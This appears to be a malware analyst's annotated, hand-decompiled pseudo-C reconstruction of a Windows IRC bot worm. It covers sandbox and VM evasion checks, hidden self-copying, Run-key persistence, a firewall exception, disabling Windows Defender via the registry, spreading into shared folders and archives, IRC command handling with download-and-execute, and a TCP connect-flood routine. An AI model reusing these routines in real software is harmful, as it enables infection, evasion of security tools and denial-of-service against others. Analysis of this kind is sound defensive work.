start{
  WinMain(hInstance, hPrevInstance, lpCmdLine, nShowCmd){
    DWORD dwMilliseconds = 3E8h <==> 1000d which is 1000 msec <==> 1 sec
    Sleep(dwMilliseconds);  //Call sleep function and pass it parameter --0040547E
    int secure = sub_4014B0(); //CHECK FOR SANDBOX/SECURE ENVIRONMENT
    // observation even if a secure environment is found the code will still execute
    // normally. After the test to see if eax contains 1. There is just a normal
    // non-conditional jump which continues the execution.
    CreateMutexA("t8"); //creates or opens a named or unamed mutex object
    if(GetLastError() == 0B7h) //0B7h == ERROR_ALREADY_EXISTS
      return;
    GetModuleFileNameA();
    DeleteFileA(lpFileName = ":Zone.Identifier");
    /* GetModuleFileNameA() will return the full path for the file that contians the
     * specified module.
     *
     * Zone identifier files are known as alternative data stream files,
     * they are used to describe the data of other files, metadata. They have the
     * same filename as the file they are downloaded with plus :Zone.Identifier
     * i.e. you download "test.exe" then the zone identifier would be
     * "test.exe:Zone.Identifier."
     *
     * Based on these facts I am assuming that the malware is deleating the Zone
     * Identifier that was downloaded along with itself
     */
    /* In the for loop the malware will attempt to place itself in either %windir%,
     * %userprofile%, or %temp%. Once it is able to place itself in one of those
     * locations it will check and see if it was already there in the first place
     * meaning that the malware is being executed again, not for the first time,
     * and if this is true it will not set the readonly, hidden, system attribute
     * and registry keys. If this is the first time executing it will set those.
     *
     * After copy the file it will jump to another location which creates 4 threads
     */
    for(int i = 0; i<3; i++){ //loops to try to copy malware into another folder
       Strings[] envStrings = {"%windir%", "%userprofile%", "%temp%"};
       Strings[] fullPath = ExpandEnvironmentStringsA(envStrings, lpDst, nSize = 104h);
       //expands environment-variable strings and replaces them with the values
       //defined for the current user
       //i.e. %winddir% --> C:\WINDOWS
       //     %userprofile% --> C:\Document and Settings\<username>
       //     %temp% --> C:\Document and Settings\<username>\Local Settings\Temp
       //Since we are running the user Administrator <username> would be Administrator
       String folderPath = fullPath[i] + "\\M-50504508848879876012050406030";
       String malwarePath = folderPath + "\\winmgr.exe";
       if(PathFileExistsA(malwarePath)){ //if malware  exist
         if(lpExistingFileName == malwarePath){ //if file has already been moved in prior iteration...skip attribute/reg value setting
           loc_4058AD();
           break;
         }
       }
       else{ //malware does not exists
         if(PathFileExistsA(folderPath)){ //folder doesnt exist
           CreateDirectoryA(lpPathName = folderPath, lpSecurityAttributes = 0) //create folder
         }
         //then copy malware to folder
         if(CopyFileA(lpExistingFileName, lpNewfileName = malwarePath, bFailIfExits == 0)){ //if copy file fails...we loop again and try a different location
           continue;
         }
         else{    //if succeeds
          if(lpExistingFileName == malwarePath){ //if file has already been moved in prior iteration...skip attribute/reg value setting
            loc_4058AD();
          }
          //set attributes
          String[] dwFileAttributes = {""}
          int dwFileAttributes = 7; //HIDDEN(2) READONLY(1) SYSTEM(4)
          SetFileAttributes(lpFileName = folderPath, dwFileAttributes); //makes malware folder hidden, readonly, and system
          SetFileAttributes(lpFileName = malwarePath, dwFileAttributes);  //makes malware hidden, readonly, and system

          //registry keys set

          //Sets Firewall Settings
          int hKey = 80000002h; //HKEY_LOCAL_MACHINE SOURCE_13
          String subkey = "SYSTEM\\CurrentcontrolSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplication\\List\\";
          int ulOptions = 0;
          int samDesired = 0F003Fh;
          if(RegOpenKeyExA(hKey, subkey, ulOptions, samDesired, phkResult) == 0){//key opened successfully SOURCE_14
            String lpData = malwarePath + ":*:Enabled:Microsoft Windows Manager"; //figured out by black box testing
            RegSetValueExA(hKey, lpValueName = malwarePath, Reserved, dwType, lpData, cbData); //SOURCE_15
            //adds winmgr.exe to list of programs that are allowed through the firewall
            RegCloseKey(hKey);
          }

          //Sets Auto Run for Local Machine
          int hKey = 80000002h; //HKEY_LOCAL_MACHINE
          String subkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";
          if(RegOpenKeyExA(hKey, subkey, ulOptions, samDesired, phkResult) == 0){
            String lpValueName = "Microsoft Windows Manager";
            RegSetValueExA(hKey, lpValueName, Reserved, dwType, lpData = malwarePath, cbData);
            //adds Microsoft Windows Manager value with data consitting of winmgr file location -- blackbox testing
            RegCloseKey(hKey);
          }

          //Sets Auto run for Local User
          int hKey = 80000001h; //HKEY_CURRENT_USER
          String subkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";
          if(RegOpenKeyExA(hKey, subkey, ulOptions, samDesired, phkResult) == 0){
            String lpValueName = "Microsoft Windows Manager";
            RegSetValueExA(hKey, lpValueName, Reserved, dwType, lpData = malwarePath, cbData);
            //adds Microsoft Windows Manager value with data consititng of winmgr file location -- blackbox testing
            RegCloseKey(hKey);
          }

          //Sets Windows Defender Settings
          int hKey = 80000002h; //HKEY_LOCAL_MACHINE
          String subKey = "SYSTEM\\CurrentControlSet\\services\\WinDefend\\";
          if(RegOpenKeyExA(hKey, subkey, ulOptions, samDesired, phkResult) == 0){
            String lpValueName = "Start";
            RegSetValueExA(hKey, lpValueName, Reserved, dwType, lpData = 4, cbData);
            //List of Startup types for Windows Defender: Automatic (Delayed), Automatic, Manual, Disabled
            //Fourth choice is disabled... assumption this command disables windows defender SOURCE_16
            RegCloseKey(hKey);
          }

          //unsure
          sub_403080(){

          }

          //now we remove the orignal instance of the malware
          sub_403640(){ //Line -- 004058A0
            //if this call is removed...the original file will not be deleted
            //create a bat file (w.bat) to remove the orignal file
            //executed with ShellExecuteA
          }

          loc_4058AD(); //now can move to loc_4058AD()
         }
       }
     }
}

sub_4014B0(){ //Line -- 00405484 Check for secure environment
  if(sub_40100() || sub_401220() || sub_401260() || sub_4012E0() || sub_4012A0()
    || sub_4013F0() || sub_401470() || IsDebuggerPresent()){
      return 1;
    }
  return 0;
}

//Checks for hard drive partition names
sub_40100(){ //Line -- 004014B4
  String aQemu = "qemu"
  String unk1 = "???";
  String unk2 = "???";
  String FileName = "\\\\.\\PhysicalDrive0";
  int dwDesiredAccess = 0, int dwShareMode = 3, int lpSecurityAttributes = 0;
  int dwCreationDisposition = 3, int dwFlagsAndAttributes = 0, int hTemplateFile = 0;
  int hDevice = CreateFileA(FileName, dwDesiredAccess, dwShareMode, //Line -- 0040104F SOURCE_1
    lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
    /* From MSDN:
     * dwDesiredAccess = 0 ==> Allows application to query metadata (i.e. file, directory or device attributes)
     * without accessing that file or device, even if read access would have been denied
     *
     * dwShareMode = 3 ==> not listed
     *
     * lpSecurityAttributes = 0 ==> not used
     *
     * dwCreationDisposition = 3 ==> Open Existing File
     *
     * dwFlagsAndAttributes = 0 ==> not listed
     *
     * hTemplateFile = 0 ==> when opening an existing file, this parameter is not used
     *
     * returns handle to the specified file
     *
     * REMARKS: We well query the PhysicalDrive0 and return a handle to it
     * to analyze it later on in DeviceIoControl
     */

   int dwIoControlCode = 2D1400h; //IOCTL_STORAGE_QUERY_PROPERTY SOURCE_2
   int lpInBuffer = ??;
   int lpInBufferSize = 0Ch;
   int lpOutBuffer = ??;
   int nOutBufferSize = 80h;
   int lpBytesReturned = ??;
   int lpOverlaped = 0;

   DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize, //Line -- 00401054 SOURCE_3
    lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlaped);
     /* From MSDN
      * Using the handle returned from CreateFileA, that device will have an operation
      * performed on it base on the control code. The control code given returns the properties
      * of the storage device.
      *
      */

    /* Following the query of PhysicalDrive0 we will check to see if "qemu" and two
     * unknown strings match the PhysicalDrive0. If it does we will return 1
     *
     * QEMU is an open source hardware virtulizer. My assumption here is that
     * the malware will check to see if it is in a virtual environment by
     * querying the harddrive and checking its name/properties
     *
     * We do not know the other two string values that it checks against while
     * analyzing this statically but an assumption would be that it checks for
     * other common virtual environment names
     */
     return 0/1; //return 0 if no v.env found, return 1 if one is found
}
//checks running processes against a list of black Listed Processes
sub_401220(){ //Line -- 004014C0
  int count = 0;
  while(count < 13){
    String[] blackListedProcess = {??, ...., ???}; //13 instances based on the fact it loops 13 times
    if(sub_4031F0(blackListedProcess[count]) == 1){ //Line -- 00401247
      return 1;
    }
    count += 1;
  }
  return 0;
}

//actual comparision of blacklistprocess vs running processes
sub_4031F0(String badProcess){ //SOURCE_4 Line -- 004031F0
  int dwFlags = 0Fh; //TH32CS_SNAPALL
  int th32ProcessID = 0;
  CreateTollhelp32Snapshot(dwFlags, th32ProcessID);
  /* From msdn
   * TH32CS_SNAPALL -- Includes all processes and threads in the system,
   * plus the heaps and modules of the process specified in th32ProcessID.
   * Equivalent to specifying the TH32CS_SNAPHEAPLIST, TH32CS_SNAPMODULE,
   * TH32CS_SNAPPROCESS, and TH32CS_SNAPTHREAD values combined using an
   * OR operation ('|').
   *
   * th32ProcessID = 0 -- To enumerate the heap or module states for all
   * processes, specify TH32CS_SNAPALL and set th32ProcessID to zero.
   */

  //retrieve information about the first process encounted in a system snapshot SOURCE_6
  Process checkProcess = Process32First(hSnapshot, lppe);
  while(checkProcess != null){
    if(checkProcess == badProcess){
      CloseHandle(hObject);
      return 1;
    }
    checkProcess = Process32Next(hObject); //retrieves info about the next process in a system snapshot
  }
  CloseHandle(hObject);
  return 0;
}

//Checks against a list of loaded modules (.exe or .dll) and if one is found return 1
sub_401260(){ // Line -- 004014CC
  String[] listOfModules = {??, ..., ??}; //five of them
  for(int i = 0; i < 5; i++){
    String lpModuleName = listOfModules[i];
    if(GetModuleHandleA(lpModuleName) != 0) //if this succeeds handle will be returned SOURCE_7
      return 1; //module is found
  }
  return 0;
}

//look at substring for file objects TODO check with don
sub_4012E0(){ //Line -- 004014D8
  //SOURCE_8
  String filePath = GetModuleFileNameA(hModule, lpFileName, nSize); //retrieves path for file that contains specific module
  //SOURCE_9
  String fileName = PathFindfileNameA(); //searches a path for a file name
  if(fileName != null){
    for(int i = 0; i <3; i++){
      if()//compare...if comparision found)
        return 1;
    }
  }
  //loc_401394
  for(int i = 0; i<6; i++){
    //if substring is contained in string
      //return 1
  }
  return 0
}

//look for current windows opened
sub_4012A0(){ //Line -- 004014E4
  //assumption -- blacklisted windows contain debugger tools such as immunity, wireshark, or olly
  String[] blacklistedWindows = {??, ??, ??, ??}; //based on comparision assume 4 windows
  int lpWindowName = 0; //optional
  for(int i = 0; i < 4; i++){
    if(FindWindowA(blacklistedWindows[i], lpWindowName)) //SOURCE_9
      return 1;
  }
  return 0;
}
//checks name of user associated with the calling thread
sub_4013F0(){ //Line -- 004014F0
  String[] listOfUsers = {??, ..., ??} //9 users
  for(int i = 0; i < 9; i++){
    String username = GetUserNameA(lpBuffer); //SOURCE_10
    /* From MSDN
     * lpBuffer is the pointer to the buffer to receive the user's logon name
     */
    if(username == listOfUsers[i])
      return 1;
  }
  return 0;
}

//checks for wine has been exported by kernel32.dll
sub_401470(){ //Line -- 004014FC
  String hModule = GetModuleHandleA("kernel32.dll"); //returns handle to module
  if(GetProcAddress(hModule, "wine_get_unik_file_name")){ //retrieve the address of an exported function from specified dll
    return 1;                                             //SOURCE_11
  }
  return 0;
}

loc_4058AD(){
	createProcess(sub_4023B0());
	createProcess(sub_4028F0());
	createProcess(sub_401530());
	createProcess(sub_405430());
	exit; //exit malware
}

//removable drives and network drives
sub_4023B0(){
	//checks if drives are a or b... if they are exit
	//
}


sub_4028F0(){ //spreads malware to other drives
	DWORD __stdcall sub_4028F0(LPVOID arg0) {
		char* buffer[0x1B];
		char* lpPathName;
		
		memset(buffer, 0, 0x68);
		GetLogicalDriveStringsA(0x68, buffer);
		
		lpPathName = Buffer;
		int index = 0;
		while(lpPathName[index] != 0) {
			if(GetDriveType(lpPathName) == 3 /* DRIVE_FIXED */) {
				//Drive is non removable (i.e. hard disk or flash drive)
				if(SetCurrentDirectoryA(lpPathName)) {
					sub_402630();
				}
			}
			index += 1;
		}
		
		ExitThread(0);
		return;
	}

	void sub_402630() {
		char pszPath[0x108];
		char FileName[0x108];
		int hFindFile;
		char* var_14c;
		_WIN32_FIND_DATAA FindFileData;
		int FilePart;
		
		memset(pszPath, 0, 0x104);
		memset(FileName, 0, 0x104);
		
		hFindFile = FindFirstFileA("*.*", &FindFileData);
		if(hFindFile == -1) {
			return;
		}
		
		while(1) {
			if(FindFileData.cFileName != '.') {
				if(FindFileData.dwFileAttributes & 0x10 != 0 /* FILE_ATTRIBUTE_DIRECTORY */) {
					if(SetCurrentDirectoryA(FindFileData.cFileName) != 1) {
						SetCurrentDirectoryA(".."); //go to parent directory
					}
				}
				else {
					if(GetFullPathNameA(FindFileData.cFileName, 0x104, FileName, &FilePart) != 0) {
						if(strstr(FileName, "Recycle.Bin") != 0) {
							CharLowerA(pszPath, strcpy(pszPath, FileName));
							int index = 0;
							char* folders = {"\\public_html", "\\htdocs", "\\httpdocs", "\\wwwroot", "\\share", "\\income", "\\upload", "\\warez"};
							while(index < 9) {
								if(strstr(pszPath, folders[index]) != 0) {
									var_14c = PathFindFileNameA(pszPath);
									if(strstr(var_14c, ".exe") != NULL) {
										SetFileAttributesA(FileName, 0x800;
										DeleteFileA(FileName);
										sub_402540(FileName); //creates a file in the temp directory and writes some stuff to it
										CopyFileA(FileName);
									}
									Sleep(0x64);
									if(strstr(pszPath, ".zip") != NULL) {
										SetFileAttributesA(FileName, 0x80);
										DeleteFileA(FileName);
										sub_405B50(sub_402540("README.txt.scr")); //creates 2 files and writes a bunch of stuff to them
									}
									Sleep(0x64);
									if(strstr(pszPath, ".rar") != 0) {
										SetFileAttributesA(FileName, 0x80);
										DeleteFileA(FileName);
										sub_402A10(FileName, sub_402540("README.txt.scr")); //creates 2 files and writes a bunch of stuff to them
									}
									Sleep(0x64);
									index += 1;
								}
								
							}
						}
					}
				}
			}
			
			if(FindNextFileA(hFindFile, &FindFileData) == 0) {
				FindClose(hFindFile);
				return;
			}
			
		}
	}

	char* sub_402540() {
	char ExistingFileName[0x108];
	int var_10c[4];
	
	memset(NewFileName, 0, 0x64); //NewFileName is a global arrary
	memset(ExistingFileName, 0, 0x104);
	
	GetTempPathA(NewFileName, 0x64);
	GetModuleFileNameA(ExistingFileName, 0x104);
	strcat(NewFileName, sub_402F10(0x0A)); //append random string to NewFileName
	if(CopyFileA(ExistingFileName, NewFileName, 0) != 0) {
		SetFileAttributesA(NewFileName, 0x80);
		int file = fopen(NewFileName, "a+");
		if(file != 0) {
			fprintf(file, sub_403290(0));
			fclose(file);
		}
	}
	return NewFileName;
}
}

//scan for processes
sub_401530(){
}

//IRC server
sub_405430(){
	// sub_403F50: Sends irc commands to the irc server.
	// Procedure address: 403F50h
	int __cdecl sub_403F50(SOCKET s, int arg_4, char* arg_8, char* arg_c) {
		int result;
		char var_240[0x40];
		char buf[0x200];

		//zero var_240
		var_240[0] = 0;
		memset(var_240+1, 0, 0x3F);

		switch(arg_4) {
		case 0:
			strncpy(var_240, "NICK", 0x3F);
			_snprintf(buf, 0x1FF, "%s %s\r\n", var_240, arg_8)
			break;

		case 1:
			strncpy(var_240, "USER", 0x3F);
			_snprintf(buf, 0x1FF, "%s %s \"\" \"x\" :%s\r\n", var_240, arg_8, arg_8);
			break;

		case 2:
			strncpy(var_240, "PONG", 0x3F);
			_snprintf(buf, 0x1FF, "%s %s\r\n", var_240, arg_8);
			break;

		case 3:
			strncpy(var_240, "JOIN", 0x3F);
			_snprintf(buf, 0x1FF, "%s %s %s\r\n", var_240, arg_8, arg_c);
			break;

		case 4:
			strncpy(var_240, "PRIVMSG", 0x3F);
			_snprintf(buf, 0x1FF, "%s %s :%s\r\n", var_240, arg_c, arg_8);
			break;

		default:
			return 0;
		}

		memset(var_240, 0, 0x40);
		result = send(s, buf, strlen(buf), 0); //returns number of bytes sent if successfull,
											   //or returns SOCKET_ERROR if something goes wrong.
		memset(buf, 0, 0x200);
		return result;
	}

	// sub_404FF40: Handles messages sent by the irc server.
	// Procedure address: 404FF0h
	int __cdecl sub_404FF0(SOCKET s, char* arg_4) {
		int var_100[0x40]; //array of pointers to strings
		int index; //loop counter / index
		char var_148[0x44];

		var_148[0] = 0;
		memset(var_148+1, 0, 0x3F);

		index = 0;

		if(sub_401200(arg_4, "001") == 0) { //does arg_4 contain "001"?
			//IRC status code 001 == RPL_WELCOME, the first message sent to the client after registration

			//split input at spaces
			var_100[index] = strtok(arg_4, " ");
			while(var_100[index] != 0) {
				index += 1;
				if(index == 0x40) {
					break;
				}
				var_100[index] = strtok(0, " ");
			}

			strncpy(var_148, "PING", 0x3F);
			if(strcmp(var_100[0], var_148) == 0) {
				//if the irc server sent us a message containing PING, respond back with PONG
				memset(var_148, 0, 0x40);
				return sub_403F50(s, 2, var_100[1], 0); //not sure about var_100[1]
			}

			if(strcmp(var_100[1], "433") == 0) {
				//IRC status code 433 means that the chosen nickname is already in use
				return sub_403F50(s, 0, sub_4037F0(), 0); //try to join with a new nick
			}

			strncpy(var_148, "PRIVMSG", 0x3F);
			if(strcmp(var_100[1], var_148) == 0) {
				//we got a private message!
				if(sub_4042C0(var_100[0]) != 0) { //var_100[0] should have the string "(x" inside of it? (this is )
					if(sub_404260(var_100[3] + 1) != 0) { //var_100[3][1] should = "."?
						return sub_404E60(s, var_100);
					}
				}
			}

			if(strcmp(var_100[1], "332") == 0) {
				//IRC status code 332 (REPL_TOPIC) is a response to the TOPIC command that contains the channel topic.
				//(if the channel has no topic, code 331 (NO_TOPIC) is sent instead).
				if(sub_404260(var_100[4] + 1) != 0) { //var_100[4] should have a "." as the second character
					return sub_404E60(s, var_100);
				}
			}

			return 0;
		}
		else {
			return sub_403F50(s, 3, "#t", 0); //join channel #t of the irc server
		}
	}

	//when you recieve a private message from the irc server, the first string is ":NICK!IDENT@IP"
	//so what this is doing then, is making sure that your name is in the format "NICK!IDENT@x", instead of an ip you have "x" followed
	//by a null terminator.
	//Apparently some irc servers let you mask your ip address but it's controlled by the server operator,
	//so i assume this is a way to make sure that only authorized users can issue commands to the bot.
	//
	//I patched miniircd to replace my ip with "x" by changing line 152 (get_prefix) to:
	//    return "%s!%s@%s" % (self.nickname, self.user, "x")
	BOOL __cdecl sub_4042C0(char* arg_0) {
		int var_4;
		var_4 = strchr(arg_0, (int)'@'); //strchr: returns a pointer to the first occurance of $character in a c_str.
		if(var_4 == NULL) {
			//no occurance of '@' in arg_0
			return FALSE;
		}
		if(strcmp(var_4+1, "x") != 0) {
			//if '@' isn't followed by "x\0" -> return FALSE ? not sure about this
			return FALSE;
		}
		else {
			return TRUE;
		}
	}

	// checks if the string passed begins with ".", and then shifts the string to the left 1 character to get rid of the "."
	BOOL __cdecl sub_404260(char* arg_0) {
		if(strncmp(arg_0, ".", strlen(".")) != 0) {
			//if arg_0 doesn't start with "." -> return FALSE
			return FALSE;
		}
		memmove(arg_0, arg_0 + strlen("."), strlen(arg_0)); //shifts string left by 1 character (removing the ".")
		return TRUE;
	}

	//checks if a message from the irc server is a command.
	//commands all start with a period, and this function will strip the period from the beginning of the command.
	int __cdecl sub_404E60(SOCKET s, char** arg_4) {
		int var_94;
		char var_90[0x80];
		int var_c;
		int var_10;
		int var_8; //index into arg_4
		char* var_4;

		var_90[0] = 0;
		memset(var_90, 0, 0x7F);

		if (strcmp(arg_4[1], "332") == 0) {
			var_8 = 4;
		}
		else {
			var_8 = 3;
		}

		if(arg_4[var_8] != '#') {
			var_4 = strchr(arg_4[0], (int)'!');
			var_4* = 0; //? not sure
			strncpy(var_90, arg_4[0]+1, 0x7F);
		}
		else {
			strncpy(var_90, var_100[var_8 - 1], 0x7F);
		}

		memmove(arg_4[var_8], arg_4[var_8] + 1, strlen(arg_4[var_8])); //shift arg_4[var_8] left 1 character (gets rid of first character at arg_4[var_8][0])
		var_10 = var_8 + 1;
		var_94 = var_8;

		while(arg_4[var_10] != 0 && var_10 < 0x40) {
			if(sub_404260(arg_4[var_10])!=0) {
				var_c = sub_404330(s, arg_4, var_94, var_94, var_10, var_90);
				if(var_c < 0) {
					return var_c;
				}
			}
			var_10 += 1;
		}

		return sub_404330(s, arg_4, var_94, var_94, var_10, var_90);
	}

	//irc commands
	// address: 404330h
	//rmrf - delete self
	//s - join irc channel based on system information
	//j - join specified irc channel
	//d - download and execute file from specified url
	//f - launch a dos attack against a port/ip combination
	//arg_8 == arg_c
	int __cdecl sub_404330(SOCKET s, char** arg_4, int arg_8, int arg_c /* len? */, int arg_10) {
		int var_4;
		char var_18[0x14];
		char LCData[0x14];
		struct _OSVERSIONINFOA VersionInformation;
		char os[4]; //var_cc

		var_4 = 0x6B7274;

		if(arg_c >= 1) {
			if(strcmp(arg_4[arg_8], "rmrf") == 0) {
				//"rmrf"
				sub_403640();
				WSACleanup();
				ExitProcess(0);
			}
			if(arg_c < 2) {
				return 1;
			}
			if(strcmp(arg_4[arg_8], "s") == 0) {
				//4043C7h: "s" : takes 1 mandatory parameter
				//joins specific irc channels based on system information
				memset(var_18, 0, 0x14);
				if(strcmp(arg_4[arg_8+1], "l") == 0) {
					memset(LCData, 0, 0x14);
					GetLocaleInfoA(0x800, 7, LCData, 0x14);
					wsprintfA(var_18, "#%s", LCData);
				}

				if(strcmp(arg_4[arg_8 + 1], "o") == 0) {
					//Platform detection (what version of windows is this running on)
					//not 100% sure on the version numbers for 95, NT, 98, and ME
					VersionInformation.dwOSVersionInfoSize = 0x94;
					if(GetVersionExA(&VersionInformation) == 0) {
						os = "UNK";
					}
					else if(VersionInformation.dwMajorVersion < 4 && VersionInformation.dwMinorVersion == 0 && ) {
						if(VersionInformation.dwPlatformId == 1) {
							os = "95";
						}
						else if(VersionInformation.dwPlatformId == 2) {
							os = "NT";
						}
						else {
							os = "UNK";
						}
					}
					else if(VersionInformation.dwMajorVersion == 4 && VersionInformation.dwMinorVersion == 0x0A) {
						os = "98";
					}
					else if(VersionInformation.dwMajorVersion == 4 && VersionInformation.dwMinorVersion == 0x1A) {
						os = "ME";
					}
					else if(VersionInformation.dwMajorVersion == 5 && VersionInformation.dwMinorVersion == 0) {
						os = "2K";
					}
					else if(VersionInformation.dwMajorVersion == 5 && VersionInformation.dwMinorVersion == 1) {
						os = "XP";
					}
					else if(VersionInformation.dwMajorVersion == 5 && VersionInformation.dwMinorVersion == 2) {
						os = "2K3";
					}
					else if(VersionInformation.dwMajorVersion == 6 && VersionInformation.dwMinorVersion == 0) {
						os = "VS";
					}
					else if(VersionInformation.dwMajorVersion == 6 && VersionInformation.dwMinorVersion == 1) {
						os = "W7";
					}
					else if(VersionInformation.dwMajorVersion == 6 && (VersionInformation.dwMinorVersion == 2 || VersionInformation.dwMinorVersion == 3)) {
						os = "W8";
					}
					else if(VersionInformation.dwMajorVersion == 10 && VersionInformation.dwMinorVersion == 0) {
						os = "W10";
					}
					else {
						os = "UNK";
					}
				}

				if(strcmp(arg_4[arg_8 + 1], "u") == 0) {
					//user
					//is the malware running with regular or elevated (admin) priveleges.
					if(SHELL32_680() != 0) {
						wsprintfA(var_18, "#ADMIN");
					}
					else {
						wsprintfA(var_18, "#USER");
					}
				}

				if(strcmp(arg_4[arg_8 + 1], "a") == 0) {
					//architecture
					//x32 or x64 windows
					if(sub_403790() != 0) {
						wsprintfA(var_18, "#X64");
					}
					else {
						wsprintfA(var_18, "#X32");
					}
				}

				//sub_403F50 handles sending data to the irc server
				//3 in arg 2 means join the channel specified in the third argument
				sub_403F50(s, 3, var_18, 0);
			}

			if(strcmp(arg_4[arg_8], "j") == 0) {
				//"j" - join specified irc channel.
				//takes a required argument which is the name of the irc channel to join
				sub_403F50(s, 3, arg_4[arg_8 + 1], 0);
				return 1;
			}

			if(arg_c < 3) {
				return 1;
			}

			if(strcmp(arg_4[arg_8], "d") == 0) {
				//40474Bh: "d"
				//This command downloads an executable from a user supplied URL and executes it.
				int hInternet;
				int hFile;
				if(sub_402F90(arg_4[arg_8 + 2]) != 0) {
					//this completely scrambles arg_4[arg_8 + 2], maybe it's trying to decrypt the string?
					sub_4033A0(&var_4, arg_4[arg_8 + 2], 0x28, 2);
					if(strcmp(arg_4[arg_8 + 1], "x") != 0 && strcmp(arg_4[arg_8 + 1], "u") != 0) {
						//arg_4[arg_8 + 1] (first parameter) isn't "x" or "u"
						hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0");
						if(hInternet != 0) {
							hFile = InternetOpenUrlA(hInternet, "http://api.wipmania.com/", 0, 0, 0, 0);
							if(hFile != 0) {
								InternetReadFile(hFile, &Buffer, 0xC7h, &dwNumberOfBytesRead);
								int var_18C = strchr(Buffer, '>') + 1;
								//this continues to do a bunch of stuff based on the result
								//i didn't have time to finish this
							}
							InternetCloseHandle(hFile);
						}
						InternetCloseHandle(hInternet);
					}

					if(strcmp(arg_4[arg_8 + 1], "x") == 0 || strcmp(arg_4[arg_8 + 1], "u") == 0 || var_D0 == 1) {
						//what is var_D0?
						char var_398[0x100];
						memset(var_398, 0, 0x100);
						_snprinft(var_398, 0xFF, "%s", arg_4[arg_8 + 2]);

						if(strcmp(arg_4[arg_8 + 1], "u") == 0) {
							//first parameter after ".d" is "u"
							int var_3A4 = PathFindFileNameA(arg_4[arg_8 + 2]); //get the filename from a path
							strtok(var_3A4, "."); //where does the result of this call go???
							if(strcmp(var_3A4, "t8") != 0) {
								var_39C = 1; //this is part of an array!
							}
						}

						int Parameter = sub_403B70(1);
						//creates a new thread that executes the function at 0x4015D0
						dword_409770[Parameter * 0x0C] = sub_403C60(0x4015D0 /*StartAddress*/, Parameter, 0);
					}

					return 1;
				}
				else {
					return 1;
				}
			}

			if(arg_c < 4) {
				return 1;
			}

			if(strcmp(arg_4[arg_8], "f") == 0) {
				if(sub_403BD0(2) == 0) {
					if(sub_402F90(arg_4[arg_8 + 1]) != 0) {
						int var_3B4[0x10];

						sub_4033A0(&var_4, arg_4[arg_8 + 1]); //decrypts url?
						var_3B4[1] = arg_4[arg_8 + 1];
						var_3B4[2] = arg_4[arg_8 + 2];
						var_3B4[3] = arg_4[arg_8 + 3];
						var_3B4[0] = sub_403B70(2);

						dword_409770[var_3B4[0] * 0xC] = sub_403C60(sub_403D10, var_3B4, 0);
					}
				}
			}

			return 1;

		}
		else {
			return 1;
		}

		//expects the second character of arg_0[0] to be a number, and it strips all the numeric characteers
		//at the beginning of the string and the first non numeric character.
		int __cdecl sub_402F90(char* arg_0) {
			int var_10;
			char* var_c;
			int var_8;
			int var_4;

			var_8 = 0;

			//if the string is empty -> return 0
			if(arg_0[0] == 0) {
				return 0;
			}

			var_c = arg_0 + 1;
			var_10 = 1;

			if(var_c[0] >= '0' && var_c[0] <= '9') {
				//var_c[0] is a numeric character
				var_8 = 1;
			}

			while(arg_0[0] != 0) {
				var_10 = 0;
				var_4 = 0;

				while(var_c[0] != 0 && var_c[0] >= '0' && var_c[0] <= '9') {
					var_4 = (var_4 * 0x0A) + (var_c[0] ^ 0x30);
					var_10 = 1;
					var_c += 1;
				}

				if(var_10 == 0) {
					break;
				}

				if(var_c[0] != 0) {
					var_c += 1;
				}

				arg_0[0] = var_4;
				arg_0 += 1;
			}

			arg_0[0] = 0;
			return var_8;
		}

		//part of the command ".f"
		//arg_0[0] = ?
		//arg_0[1] = ipv4 address
		//arg_0[2] = port
		//arg_9[3] = desired iterations
		//this seems to be for dos attacks
		int __stdcall sub_403D10(PVOID arg_0) {
			int desired_iterations;
			int index;
			int var_35c;
			int cp;
			char* var_354;
			char* var_350;
			int var_34C;
			int completed_iterations;
			int argp;
			struct sockaddr_in name;
			int sockets[0xC9];
			int var_c; //possibly part of s
			int var_8;
			int dwMilliseconds;

			var_35c = arg_0[0];
			cp = arg_0[1];
			var_354 = (char*)arg_0[2];
			var_350 = (char*)arg_0[3];
			var_8 = atoi(var_354);
			desired_iterations = atoi(var_350);

			dwMilliseconds = 0x64;

			memset(name, 0, 0x10);
			name.sin_family = 2;
			name.sin_port = htons(var_8);
			var_c = 0;
			argp = 1;
			var_34c = inet_addr(cp);
			name.in_addr = var_34c;
			completed_iterations = 0;

			while(completed_iterations < desired_iterations) {
				index = 0;
				while(index < 0xC8) {
					//create a bunch of sockets
					sockets[index] = socket(AF_INET, SOCK_STREAM, 0);
					if(sockets[index] != 0x0FFFFFFF) {
						ioctlsocket(sockets[index], FIONBIO, &argp); //set non blocking mode on the socket
					}
					index += 1;
				}

				index = 0;
				while(index < 0xC8) {
					//create a tcp connection to the specified address with all the sockets we made
					connect(sockets[index], &name, 0x10);
					index += 1;
				}

				Sleep(dwMilliseconds);
				index = 0;

				while(index < 0xC8) {
					closesocket(sockets[index]);
					index += 1
				}

				var_348 += 1;
			}

			sub_403C20(var_35c);
			ExitThread(0);
			return;
		}
	}
}
//SOURCE_1 = https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-createfilea
//SOURCE_2 = https://docs.microsoft.com/en-us/windows/desktop/FileIO/disk-management-control-codes
//SOURCE_3 = https://msdn.microsoft.com/en-us/library/windows/desktop/aa363216(v=vs.85).aspx
//SOURCE_4 = https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
//SOURCE_5 = https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-process32first
//SOURCE_6 = https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-process32next
//SOURCE_7 = https://msdn.microsoft.com/en-us/library/windows/desktop/ms683199(v=vs.85).aspx
//SOURCE_8 = https://msdn.microsoft.com/en-us/library/windows/desktop/ms683197(v=vs.85).aspx
//SOURCE_9 = https://msdn.microsoft.com/en-us/library/windows/desktop/ms633499(v=vs.85).aspx
//SOURCE_10 = https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-getusernamea
